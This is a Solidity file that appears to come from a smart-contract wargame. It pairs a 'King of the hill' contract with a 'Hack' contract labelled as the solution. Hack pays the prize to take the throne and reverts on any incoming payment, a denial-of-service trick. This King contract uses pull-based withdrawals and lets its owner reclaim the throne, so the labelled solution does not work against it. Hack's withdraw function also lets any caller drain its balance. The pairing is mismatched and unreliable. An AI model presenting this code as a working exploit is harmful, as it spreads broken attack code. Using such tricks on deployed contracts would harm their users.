// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract King {
    address payable public king;
    uint public prize;
    address payable public owner;

    mapping(address => uint) public pendingWithdrawals;

    event NewKing(address indexed newKing, uint prize);

    constructor() payable {
        owner = payable(msg.sender);
        king = payable(msg.sender);
        prize = msg.value;
    }

    receive() external payable {
        _becomeKing();
    }

    function becomeKing() public payable {
        _becomeKing();
    }

    function _becomeKing() internal {
        require(msg.value >= prize || msg.sender == owner, "Insufficient value to become the king");
        
        if (king != address(0)) {
            pendingWithdrawals[king] += prize;
        }
        
        king = payable(msg.sender);
        prize = msg.value;

        emit NewKing(msg.sender, msg.value);
    }

    function withdraw() public {
        uint amount = pendingWithdrawals[msg.sender];
        require(amount > 0, "No funds to withdraw");

        pendingWithdrawals[msg.sender] = 0;
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Withdrawal failed");
    }

    function _king() public view returns (address payable) {
        return king;
    }
}


pragma solidity ^0.8.0;

contract Hack {
constructor(address payable target) payable {
    uint prize = King(target).prize();
       (bool ok,) = target.call{value: prize}("");
        require(ok, "tx failed");
    }
fallback() external payable {

    revert();
}

function withdraw() external {
       payable(msg.sender).transfer(address(this).balance);
   }



}

//solution